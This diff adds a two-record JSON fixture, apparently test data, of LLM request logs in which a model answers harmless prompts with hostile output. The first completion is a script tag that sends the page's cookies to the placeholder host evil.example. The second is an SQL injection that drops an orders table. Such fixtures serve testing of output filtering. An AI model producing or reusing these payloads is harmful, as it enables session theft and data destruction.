@@ -1,0 +1,4 @@
+[
+  {"timestamp":"2026-06-03T13:00:00Z","user.id":"user-5501","app.id":"web-assistant","llm.model":"forge-instruct-1","llm.prompt":"Render a greeting banner","llm.completion":"<script>fetch('//evil.example/c?'+document.cookie)</script>","llm.prompt_tokens":12,"llm.completion_tokens":30,"request.source_ip":"198.51.100.61"},
+  {"timestamp":"2026-06-03T13:01:00Z","user.id":"user-5502","app.id":"report-bot","llm.model":"forge-instruct-1","llm.prompt":"Summarize the orders table","llm.completion":"Sure: '; DROP TABLE orders; --","llm.prompt_tokens":14,"llm.completion_tokens":18,"request.source_ip":"198.51.100.62"}
+]
